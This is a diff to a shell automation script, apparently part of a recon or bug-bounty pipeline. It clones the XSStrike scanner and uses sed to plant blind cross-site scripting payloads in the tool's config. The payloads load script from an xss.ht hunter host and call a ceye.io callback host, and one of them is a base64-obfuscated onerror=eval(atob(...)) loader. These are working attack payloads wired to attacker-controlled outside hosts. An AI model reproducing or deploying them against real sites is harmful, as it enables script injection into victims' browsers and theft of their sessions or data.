@@ -51,7 +51,7 @@ ls ; wc -l $input ; du -h
 #创建目录
 output=$output ; export output=$output
 rm -rf /root/script/3_httprobe/XSStrike
-cd /root/script/3_httprobe ; git clone https://github.com/s0md3v/XSStrike ; cd /root/script/3_httprobe/XSStrike ; pip3 install -r requirements.txt
+cd /root/script/3_httprobe ; git clone https://github.com/s0md3v/XSStrike ; cd /root/script/3_httprobe/XSStrike ; pip3 install -r requirements.txt ; sed "s,    '<sCriPt sRc=//14.rs>'\,,    'q1b3q6.ceye.io'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=https://xsshunternihao.xss.ht></script>'\,\n    'http://q1b3q6.ceye.io/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=https://xsshunternihao.xss.ht></script>'\,\n    '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVybmloYW8ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xsshunternihao.xss.ht\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py
 i=1
 echo '#!/bin/bash' >> /root/script/3_httprobe/exe.sh
 
